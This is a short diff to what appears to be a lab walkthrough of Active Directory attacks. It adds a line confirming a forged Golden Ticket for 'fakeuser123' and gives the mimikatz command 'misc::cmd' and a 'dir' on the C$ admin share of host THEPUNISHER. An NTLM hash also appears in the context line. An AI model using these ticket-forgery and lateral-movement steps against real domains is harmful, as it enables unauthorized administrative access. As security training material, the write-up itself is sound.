@@ -118,4 +118,10 @@ ntlm hash: 2617733570dcba888a76e40359f8a359
 
 ![image](https://github.com/user-attachments/assets/668c803d-d4dc-4e3d-985f-a97a78ac3667)
 
-**From this we have no obtained a Golden Ticket for our fakeuser in current session**
+**From this we have now obtained a Golden Ticket for our 'fakeuser123' in current session**  
+pull up cmd with the newly created Golden Ticket session.
+    
+    misc::cmd
+
+    dir \\THEPUNISHER\c$
+    
